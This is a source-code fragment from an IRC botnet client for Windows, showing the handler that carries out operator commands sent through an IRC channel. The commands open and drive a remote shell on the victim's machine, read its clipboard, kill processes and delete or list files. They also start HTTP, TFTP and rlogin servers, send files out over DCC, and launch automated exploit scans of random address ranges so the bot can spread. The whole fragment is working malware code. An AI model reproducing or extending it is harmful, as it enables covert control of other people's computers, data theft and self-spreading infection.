				stopthread(sock,a[2],notice,silent,"8::[4ScAn8]::","Scan",SCAN_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp(scanstats_cmd, a[s]) == 0) {
				ListExploitStats(sock,a[2],notice);

				return repeat;
			}
			else if (strcmp(reconnect_cmd, a[s]) == 0) {
				irc_sendv(sock, "QUIT :reconnecting\r\n");
				addlog("8::[4MaIn8]:: Reconnecting.");

				return 0;
			}
			else if (strcmp(disconnect_cmd, a[s]) == 0) {
				irc_sendv(sock, "QUIT :disconnecting\r\n");
				addlog("8::[4MaIn8]:: Disconnecting.");

				return -1;
			}
			else if (strcmp(quit_cmd, a[s]) == 0) {
				if (a[s+1]) {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendv(sock, "QUIT :%s\r\n", y);
					}
				} else 
					irc_sendv(sock, "QUIT :later\r\n"); 

				return -2;
			}
			else if (strcmp(status_cmd, a[s]) == 0) {
				sprintf(sendbuf, "8::[4MaIn8]:: Status: Ready. Bot Uptime: %s.", Uptime(started));
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp(botid_cmd, a[s]) == 0) {
				sprintf(sendbuf, "8::[4MaIn8]:: Bot ID: %s.", botid);
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp(reboot_cmd, a[s]) == 0) {
				sprintf(sendbuf, ((Reboot())?("8::[4MaIn8]:: Rebooting system."):("8::[4MaIn8]:: Failed to reboot system.")));
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp(threads_cmd, a[s]) == 0) {
				TLIST tlist;
				_snprintf(tlist.chan, sizeof(tlist.chan), a[2]);
				tlist.sock = sock;
				tlist.notice = notice;
				tlist.silent = silent;
				tlist.full = ((a[s+1])?((strcmp(a[s+1],"sub") == 0)?(TRUE):(FALSE)):(FALSE));

				sprintf(sendbuf, "8::[4ThReAdS8]:: List threads.");
				tlist.threadnum = addthread(sendbuf, LIST_THREAD, NULL);
				if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
					while (tlist.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"8::[4ThReAdS8]:: Failed to start list thread, error: <%d>.", GetLastError());
				addlog(sendbuf);
	
				return repeat;
			}
			else if (strcmp(aliases_cmd, a[s]) == 0) {
				aliaslist(sock, a[2], notice);
				addlog("8::[4MaIn8]:: Alias list.");

				return repeat;
			}
			else if (strcmp(log_cmd, a[s]) == 0) {
				SHOWLOG showlog;
				showlog.filter[0] = '\0';
				if (x != NULL && a[s+1]) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) 
						_snprintf(showlog.filter,sizeof(showlog.filter),"%s",y);
				}
				_snprintf(showlog.chan, sizeof(showlog.chan), a[2]);
				showlog.sock = sock;
				showlog.notice = notice;
				showlog.silent = silent;

				sprintf(sendbuf, "8::[4LoG8]:: Listing log.");
				showlog.threadnum = addthread(sendbuf, LOG_THREAD, NULL);
				if (threads[showlog.threadnum].tHandle = CreateThread(NULL, 0, &ShowLogThread, (LPVOID)&showlog, 0, &id)) {
					while (showlog.gotinfo == FALSE)
						Sleep(50);
				} else
					addlogv("8::[4LoG8]:: Failed to start listing thread, error: <%d>.", GetLastError());

				return 1;
			}
			else if (strcmp(clearlog_cmd, a[s]) == 0) {
				clearlog(sock, a[2], notice, silent);

				return 1;
			}
			#ifndef NO_NETINFO
			else if (strcmp(netinfo_cmd, a[s]) == 0) {
				irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
				addlog("8::[4MaIn8]:: Network Info.");

				return repeat;
			}
			#endif
			#ifndef NO_SYSINFO
			else if (strcmp(systeminfo_cmd, a[s]) == 0) {
				irc_privmsg(sock, a[2], sysinfo(sendbuf, sock), notice);
				addlog("8::[4MaIn8]:: System Info.");

				return repeat;
			}
			#endif
			else if (strcmp(removebot_cmd, a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "8::[4MaIn8]:: Removing Bot.", notice);
				#ifdef DEBUG_LOGGING
				//closedebuglog();
				#endif
				fclosesocket(sock);
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			}
			#ifndef NO_PROCESS
			else if (strcmp(procs_cmd, a[s]) == 0) {
				if (findthreadid(PROC_THREAD) > 0) {
					if (!silent) irc_privmsg(sock, a[2], "8::[4PrOc8]:: Already running.", notice);
				} else {
					LPROC lproc;
					_snprintf(lproc.chan, sizeof(lproc.chan), a[2]);
					lproc.sock = sock;
					lproc.notice = notice;
					lproc.silent = silent;
					lproc.full = FALSE;
					if (a[s+1])
						if (strcmp("full", a[s+1]) == 0)
							lproc.full = TRUE;

					sprintf(sendbuf,"8::[4PrOcS8]:: Proccess list.");
					lproc.threadnum = addthread(sendbuf, PROC_THREAD, NULL);
					if (threads[lproc.threadnum].tHandle = CreateThread(NULL, 0, &listProcessesThread, (LPVOID)&lproc, 0, &id)) {
						while (lproc.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"8::[4PrOcS8]:: Failed to start listing thread, error: <%d>.", GetLastError());
					addlog(sendbuf);
				}

				return 1;
			}
            #endif
			else if (strcmp(uptime_cmd, a[s]) == 0) {
				DWORD uptime = -1, total = GetTickCount() / 1000;

				if(a[s+1])
					uptime = atoi(a[s+1]); 
			   
				if (total/86400 >= uptime || uptime == -1) { 
					sprintf(sendbuf, "8::[4MaIn8]:: Uptime: %s.", Uptime());
					irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				} 

				return repeat;
			}
			else if (strcmp(driveinfo_cmd, a[s]) == 0) {
				DriveInfo(sock, a[2], notice, a[s+1]);

				return 1;
			}
			else if (strcmp(testdlls_cmd, a[s]) == 0) {
				CheckDLLs(sock,a[2],notice,silent);

				return 1;
			}
			#ifdef DUMP_ENCRYPT
			else if (strcmp(encrypt_cmd, a[s]) == 0) {
				encryptstrings((sizeof(authost) / sizeof(LPTSTR)),(sizeof(versionlist) / sizeof(LPTSTR)),sock,a[2],notice);

				return 1;
			}
			#endif
			#ifndef NO_REMOTECMD
			else if (strcmp(opencmd_cmd, a[s]) == 0) {
				if (findthreadid(RCMD_THREAD) > 0) {
					sprintf(sendbuf ,"8::[4CmD8]:: Remote shell already running.");
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
				} else {
					if (open_cmd(sock,a[2]) == -1) 
						sprintf(sendbuf,"8::[4CmD8]:: Couldn't open remote shell.");
					else 
						sprintf(sendbuf,"8::[4CmD8]:: Remote shell ready.");
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
				}

				return 1;
			}
			else if (strcmp(cmdstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"8::[4CmD8]::","Remote shell",RCMD_THREAD,a[s+1]);

				return 1;
			}
			#endif
			else if (strcmp(who_cmd, a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "1-::[4LoGiN lIsT8]::-", notice);
				for (i = 0; i < MAXLOGINS; i++) {
					sprintf(sendbuf,"%d. %s",i,((masters[i][0] != '\0')?(masters[i]+1):("<Empty>")));
    				irc_privmsg(sock, a[2], sendbuf, notice, TRUE);
				}
				addlog("8::[4MaIn8]:: Login list complete.");
			}
			else if (strcmp(getclipboard_cmd, a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "1-::[4ClIpBoArD dAtA8]::-", notice);
				irc_privmsg(sock, a[2], GetClipboardText(), notice);
				addlog("8::[4MaIn8]:: Get Clipboard.");

				return repeat;
			}
			else if (strcmp(flusharp_cmd, a[s]) == 0) {
				if (FlushARPCache())
					_snprintf(sendbuf,sizeof(sendbuf),"8::[4FlUsH DnS8]:: ARP cache flushed.");
				else
					_snprintf(sendbuf,sizeof(sendbuf),"8::[4FlUsH DnS8]:: Failed to flush ARP cache.");
				
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp(flushdns_cmd, a[s]) == 0) {
				if (fDnsFlushResolverCache) {
					if (fDnsFlushResolverCache())
						_snprintf(sendbuf,sizeof(sendbuf),"8::[4FlUsH DnS8]:: DNS cache flushed.");
					else
						_snprintf(sendbuf,sizeof(sendbuf),"8::[4FlUsH DnS8]:: Failed to flush DNS cache.");
				} else
					_snprintf(sendbuf,sizeof(sendbuf),"8::[4FlUsH DnS8]:: Failed to load dnsapi.dll.");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp(currentip_cmd, a[s]) == 0) {
				int scanthread;
				if (a[s+1])
					scanthread = atoi(a[s+1]);
				else
					scanthread = findthreadnum(SCAN_THREAD);
				if (scanthread != 0)
					currentIP(sock, a[2], notice, scanthread);

				return repeat;
			}
			#ifndef NO_RLOGIND
			else if (strcmp(rloginserver_cmd, a[s]) == 0) {
				RLOGIND rlogind;

				rlogind.port = ((a[s+1])?((atoi(a[s+1])==0)?(rloginport):(atoi(a[s+1]))):(rloginport));
				_snprintf(rlogind.username, sizeof(rlogind.username), ((a[s+2])?(a[s+2]):(user)));
				_snprintf(rlogind.hostname, sizeof(rlogind.hostname), ((a[s+3])?(a[s+3]):("")));
				_snprintf(rlogind.chan, sizeof(rlogind.chan), a[2]);
				rlogind.sock = sock;
				rlogind.notice = notice;
				rlogind.silent = silent;

				sprintf(sendbuf,"8::[4RlOgInD8]:: Server listening on IP: %s:%d, Username: %s.", GetIP(sock), rlogind.port, rlogind.username);
				rlogind.threadnum = addthread(sendbuf,RLOGIN_THREAD,NULL);
				if (threads[rlogind.threadnum].tHandle = CreateThread(NULL, 0, &RlogindThread, (LPVOID)&rlogind, 0, &id)) {	
					while(rlogind.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"8::[4RlOgInD8]:: Failed to start server thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_HTTPD
			else if (strcmp(httpserver_cmd, a[s]) == 0) {
				HTTPD httpd;
				httpd.port = ((a[s+1])?((atoi(a[s+1])==0)?(httpport):(atoi(a[s+1]))):(httpport));
				httpd.enabled = ((parameters['d'])?(FALSE):(TRUE));
				if (a[s+2])
					sprintf(httpd.dir, a[s+2]);
				else {
					char sysdir[MAX_PATH], drive[10];
					GetSystemDirectory(sysdir,sizeof(sysdir));
					_splitpath(sysdir, drive, NULL, NULL, NULL);
				}
				if (httpd.dir[strlen(httpd.dir)-1] == 92) 
					httpd.dir[strlen(httpd.dir)-1] = '\0';
				httpd.sock = sock;
				_snprintf(httpd.chan, sizeof(httpd.chan), a[2]);
				httpd.notice = notice;
				httpd.silent = silent;

				sprintf(sendbuf,"8::[4HtTpD8]:: Server listening on IP: %s:%d, Directory: %s\\.", GetIP(sock), httpd.port, httpd.dir);
				httpd.threadnum = addthread(sendbuf,HTTP_THREAD,NULL);
				if (threads[httpd.threadnum].tHandle = CreateThread(NULL, 0, &HTTP_Server_Thread, (LPVOID)&httpd, 0, &id)) {	
					while(httpd.info == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"8::[4HtTpD8]:: Failed to start server thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_TFTPD
			else if (strcmp(tftpserver_cmd, a[s]) == 0) {
				if (findthreadid(TFTP_THREAD) > 0)
					sprintf(sendbuf ,"8::[4TfTpD8]:: Already running.");
				else {
					TFTP tftp;
					(a[s+1])?(_snprintf(tftp.filename, sizeof(tftp.filename), a[s+1])):(GetModuleFileName(0,tftp.filename,sizeof(tftp.filename)));
					_snprintf(tftp.requestname, sizeof(tftp.requestname), ((a[s+2])?(a[s+2]):(filename)));
					tftp.port = tftpport;
					tftp.threads = 0;
					tftp.sock = sock;
					strncpy(tftp.chan, a[2], sizeof(tftp.chan)-1);
					tftp.notice = notice;
					tftp.silent = silent;

					sprintf(sendbuf, "8::[4TfTpD8]:: Server started on Port: %d, File: %s, Request: %s.", tftp.port, tftp.filename, tftp.requestname);
					tftp.threadnum = addthread(sendbuf,TFTP_THREAD,NULL);
					if (threads[tftp.threadnum].tHandle = CreateThread(NULL, 0, &tftpserver, (LPVOID)&tftp, 0, &id)) {
						while (tftp.gotinfo == FALSE) 
							Sleep(50);
					} else
						sprintf(sendbuf,"8::[4TfTpD8]:: Failed to start server thread, error: <%d>.", GetLastError());
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_CRASH
			else if (strcmp(crash_cmd, a[s]) == 0) {
				sprintf(sendbuf,"8::[4MaIn8]:: Crashing bot.");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
				
				strcmp(a[s+5],"crash"); 

				return 1;
			}
			#endif
			else if (strcmp(currentthreads_cmd, a[s]) == 0) {
				int scanthreads=findthreadid(SCAN_THREAD);
				sprintf(sendbuf ,"8::[4ThReAdS8]:: Currently [15 %d 8] Threads.", scanthreads);
				irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp(myip_cmd, a[s]) == 0) {
				sprintf(sendbuf ,"8::[4IP AdDrEsS8]:: [15 %s 8] ", GetIP(sock));
				irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1;
			}
			#ifndef NO_ADVSCAN
			else if (strcmp(scanall_cmd, a[s]) == 0) {
				if (!a[s+1] || !a[s+2] || !a[s+3]) {
					sprintf(sendbuf, "8::[4ScAn8]:: Failed to start scan, syntax is invalid.");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					return 1;
				}
				for(int i=0; scanall[i].isend != false; i++) { }
				for(int sne=0; scanall[sne].isend != false; sne++) {
					int scanthreads=findthreadid(SCAN_THREAD);
					if (scanthreads + 400/i > MAXSCANTHRD) {
						sprintf(sendbuf ,"8::[4ScAn8]:: Already [15 %d 8] scanning threads. Too many specified.", scanthreads);
						irc_privmsg(sock,a[2],sendbuf,notice);
					} else {
						ADVSCAN advscan;
						advscan.threads = atoi(a[s+1]);
						advscan.delay = atoi(a[s+2]);
						advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
						advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
						advscan.minutes = atoi(a[s+3]);
						advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
						advscan.exploit = -1;

						for(i=0;exploit[i].port != 0;i++) {
							if (strcmp(exploit[i].command, scanall[sne].command) == 0) {
								advscan.port = exploit[i].port;
								advscan.exploit = i;

								break;
							}
						}

						if (advscan.port == 0) {
							sprintf(sendbuf, "8::[4ScAn8]:: Failed to start scan, port is invalid.");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);

							return 1;
						}
						if (a[s+4] && a[s+4][0] != '#') {
							_snprintf(advscan.ip,sizeof(advscan.ip),a[s+4]);
							advscan.random = ((strchr(a[s+4],'x'))?(TRUE):(FALSE));
						} else {
							if (parameters['a'] || parameters['b'] || parameters['r']) {
								SOCKADDR_IN ssin;
								int ssin_len=sizeof(ssin);
								fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
								ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
								strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));
								
								if (parameters['r']) {
									int extractip = ((parameters['a']) ? 3 : 2);
									for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
							
									advscan.random = TRUE;
								} else
									advscan.random = FALSE;
							} else {
								sprintf(sendbuf, "8::[4ScAn8]:: Failed to start scan, no IP specified.");
								if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
								addlog(sendbuf);
							
								return 1;
							}
						}
						advscan.sock = sock;
						advscan.notice = notice;
						advscan.silent = silent;
						_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
						if (a[s+5])
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
						else if (a[s+4] && a[s+4][0] == '#')
							_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+4]);
						else if (strcmp(exploitchan,"") != 0)
							_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
						else
							advscan.msgchan[0] = '\0';

						sprintf(sendbuf, "8::[4%s8]:: %s Scan started at [15 %s 8]:%d for %d minutes with a %d second delay using %d threads.", 
							exploit[i].name, ((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.minutes, advscan.delay, advscan.threads);
						advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
						if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
							while(advscan.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"8::[4ScAn8]:: Failed to start scan thread, error: <15 %d 1>.", GetLastError());
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}
				return 1;
			}
			#endif
			#ifndef NO_ADVSCAN
			else if (strcmp(allscan_cmd, a[s]) == 0) {
				if (!a[s+1] || !a[s+2] || !a[s+3]) {
					sprintf(sendbuf, "8::[4ScAn8]:: Failed to start scan, syntax is invalid.");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					return 1;
				}
				for(int i=0; allscan[i].isend != false; i++) { }
				for(int sne=0; allscan[sne].isend != false; sne++) {
					int scanthreads=findthreadid(SCAN_THREAD);
					if (scanthreads + 400/i > MAXSCANTHRD) {
						sprintf(sendbuf ,"8::[4ScAn8]:: Already [15 %d 8] scanning threads. Too many specified.", scanthreads);
						irc_privmsg(sock,a[2],sendbuf,notice);
					} else {
						ADVSCAN advscan;
						advscan.threads = atoi(a[s+1]);
						advscan.delay = atoi(a[s+2]);
						advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
						advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
						advscan.minutes = atoi(a[s+3]);
						advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
						advscan.exploit = -1;

						for(i=0;exploit[i].port != 0;i++) {
							if (strcmp(exploit[i].command, allscan[sne].command) == 0) {
								advscan.port = exploit[i].port;
								advscan.exploit = i;

								break;
							}
						}

						if (advscan.port == 0) {
							sprintf(sendbuf, "8::[4ScAn8]:: Failed to start scan, port is invalid.");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);

							return 1;
						}
						if (a[s+4] && a[s+4][0] != '#') {
							_snprintf(advscan.ip,sizeof(advscan.ip),a[s+4]);
							advscan.random = ((strchr(a[s+4],'x'))?(TRUE):(FALSE));
						} else {
							if (parameters['a'] || parameters['b'] || parameters['r']) {
								SOCKADDR_IN ssin;
								int ssin_len=sizeof(ssin);
								fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
								ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
								strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));
								
								if (parameters['r']) {
									int extractip = ((parameters['a']) ? 3 : 2);
									for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
							
									advscan.random = TRUE;
								} else
									advscan.random = FALSE;
							} else {
								sprintf(sendbuf, "8::[4ScAn8]:: Failed to start scan, no IP specified.");
								if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
								addlog(sendbuf);
							
								return 1;
							}
						}
						advscan.sock = sock;
						advscan.notice = notice;
						advscan.silent = silent;
						_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
						if (a[s+5])
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
						else if (a[s+4] && a[s+4][0] == '#')
							_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+4]);
						else if (strcmp(exploitchan,"") != 0)
							_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
						else
							advscan.msgchan[0] = '\0';

						sprintf(sendbuf, "8::[4%s8]:: %s Scan started at [15 %s 8]:%d for %d minutes with a %d second delay using %d threads.", 
							exploit[i].name, ((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.minutes, advscan.delay, advscan.threads);
						advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
						if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
							while(advscan.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"8::[4ScAn8]:: Failed to start scan thread, error: <15 %d 1>.", GetLastError());
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}
				return 1;
			}
			#endif
			// commands requiring at least 1 parameter
			else if (a[s+1] == NULL) return 1;
			else if (strcmp(nick_cmd, a[s]) == 0) {
				irc_sendv(sock, "NICK %s\r\n", a[s+1]);
				addlogv("8::[4MaIn8]:: Nick changed to: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp(join_cmd, a[s]) == 0) {
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
				addlogv("8::[4MaIn8]:: Joined channel: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp(part_cmd, a[s]) == 0) {
				irc_sendv(sock, "PART %s\r\n", a[s+1]);
				addlogv("8::[4MaIn8]:: Parted channel: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp(raw_cmd, a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "%s\r\n", y);
						addlogv("8::[4MaIn8]:: IRC Raw: %s.",y);
					}
				}

				return repeat;
			}
			else if (strcmp(killthreads_cmd, a[s]) == 0) {
				if (strcmp("all", a[s+1]) == 0) {
					if ((i=killthreadall()) > 0)
						sprintf(sendbuf,"8::[4ThReAdS8]:: Stopped: %d thread(s).", i);
					else
						sprintf(sendbuf,"8::[4ThReAdS8]:: No active threads found.");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);					
				} else {
					for (i = s+1; i < (sizeof(a)/4); i++) {
						if (a[i]==NULL) break;
					
						if (killthread(atoi(a[i])))
							sprintf(sendbuf,"8::[4ThReAdS8]:: Killed thread: %s.",a[i]);
						else 
							sprintf(sendbuf,"8::[4ThReAdS8]:: Failed to kill thread: %s.",a[i]);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}

				return 1;
			}
			else if (strcmp(c_quit_cmd, a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
					irc_sendv(threads[atoi(a[s+1])].sock, "QUIT :later\r\n");
					Sleep(500);
					fclosesocket(threads[atoi(a[s+1])].sock);
					TerminateThread(threads[atoi(a[s+1])].tHandle, id);
					threads[atoi(a[s+1])].tHandle = 0;
					threads[atoi(a[s+1])].name[0] = '\0';
				}

				return 1;
			}
			else if (strcmp(c_randomnick_cmd, a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
					sprintf(sendbuf, "NICK %s", rndnick(ntmp));
					irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);
				}

				return repeat;
			}
			else if (strcmp(prefix_cmd, a[s]) == 0) {
				prefix = a[s+1][0];
				sprintf(sendbuf,"8::[4MaIn8]:: Prefix changed to: '%c'.",a[s+1][0]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp(openfile_cmd, a[s]) == 0) {
				if (fShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW))
					sprintf(sendbuf,"8::[4ShElL8]:: File opened: %s", a[s+1]);
				else
					sprintf(sendbuf,"8::[4ShElL8]:: Couldn't open file: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp(server_cmd, a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
				sprintf(sendbuf,"8::[4MaIn8]:: Server changed to: '%s'.",a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp(dnslookup_cmd, a[s]) == 0) {
				LPHOSTENT hostent = NULL;
				IN_ADDR iaddr;
				DWORD addr = finet_addr(a[s+1]);

				if (addr != INADDR_NONE) {
					hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
					if (hostent != NULL)
						sprintf(sendbuf, "8::[4DnS8]:: Lookup: %s -> %s.", a[s+1], hostent->h_name);
				}
				else {
					hostent = fgethostbyname(a[s+1]);
					if (hostent != NULL) {
						iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
						sprintf(sendbuf, "8::[4DnS8]:: Lookup: %s -> %s.", a[s+1], finet_ntoa(iaddr));
					}
				}
				if (hostent == NULL)
					sprintf(sendbuf,"8::[4DnS8]:: Couldn't resolve hostname.");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_PROCESS
			else if (strcmp(killproc_cmd, a[s]) == 0) {
				if(listProcesses(sock,NULL,notice,a[s+1]) == 1)
					sprintf(sendbuf,"8::[4PrOc8]:: Process killed: %s",a[s+1]);
				else
					sprintf(sendbuf,"8::[4PrOc8]:: Failed to terminate process: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp(killid_cmd, a[s]) == 0) {
				if(killProcess(atoi(a[s+1])) == 1)
					sprintf(sendbuf,"8::[4PrOc8]:: Process killed ID: %s",a[s+1]);
				else
					sprintf(sendbuf,"8::[4PrOc8]:: Failed to terminate process ID: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			else if (strcmp(delete_cmd, a[s]) == 0) { 
				if (DeleteFile(a[s+1])) 
					_snprintf(sendbuf,sizeof(sendbuf),"8::[4FiLe8]:: Deleted '%s'.",a[s+1]);
				else 
					_snprintf(sendbuf,sizeof(sendbuf),PrintError("8::[4FiLe8]::"));

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_DCC
			else if (strcmp(dccget_cmd, a[s]) == 0) {
				DCC dcc;
				memset(dcc.host,0,sizeof(dcc.host));
				sprintf(dcc.filename,"%s",a[s+1]);

			    dcc.sock = sock;
				_snprintf(dcc.sendto,sizeof(dcc.sendto),user);
				dcc.notice = notice;
				dcc.silent = silent;

				sprintf(sendbuf,"8::[4DcC8]:: Send File: %s, User: %s.",dcc.filename,dcc.sendto);
				dcc.threadnum=addthread(sendbuf,DCC_THREAD,NULL);
				if (threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &DCCSendThread, (LPVOID)&dcc, 0, &id)) {
					while (dcc.gotinfo == FALSE) 
						Sleep(50);
				} else
					sprintf(sendbuf,"8::[4DcC8]:: Failed to start transfer thread, error: <%d>.", GetLastError());
				addlog(sendbuf);

				return 1;
			}
			#endif
			else if (strcmp(list_cmd, a[s]) == 0) { 
				GetFiles(a[s+1],sock,a[2],NULL);
				addlogv("8::[4FiLe8]:: List: %s", a[s+1]);

				return repeat;
			}
			#ifndef NO_VISIT
			else if (strcmp(visit_cmd, a[s]) == 0) {
				VISIT visit;
				strncpy(visit.host, a[s+1], sizeof(visit.host)-1);
				if (a[s+2] != NULL) 
					strncpy(visit.referer, a[s+2], sizeof(visit.referer)-1);
				strncpy(visit.chan, a[2], sizeof(visit.chan)-1);
				visit.sock = sock;
				visit.silent = silent;
				visit.notice = notice;

				sprintf(sendbuf,"8::[4ViSiT8]:: URL: %s.",a[s+1]);
				visit.threadnum=addthread(sendbuf,VISIT_THREAD,NULL);
				if (threads[visit.threadnum].tHandle = CreateThread(NULL, 0, &VisitThread, (LPVOID)&visit, 0, &id)) {
					while(visit.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"8::[4ViSiT8]:: Failed to start connection thread, error: <%d>.", GetLastError());
				addlog(sendbuf);

				return repeat;
			}
			#endif
			else if (strcmp(mirccmd_cmd, a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]); 
					if (y != NULL) {
						if (!mirccmd(y))
							sprintf(sendbuf,"8::[4mIrC8]:: Client not open.");
						else
							sprintf(sendbuf,"8::[4mIrC8]:: Command sent.");
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
                }

				return repeat;
			}
			#ifndef NO_REMOTECMD
			else if (strcmp(remotecmd_cmd, a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]); 
					if (y != NULL) { 
						strcat(y,"\n");
						if (!send_commands(y)) {
							sprintf(sendbuf,"8::[4CmD8]:: Error sending to remote shell.");
							if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						}
						else
							sprintf(sendbuf,"8::[4CmD8]:: Commands: %s",y);
						addlog(sendbuf);
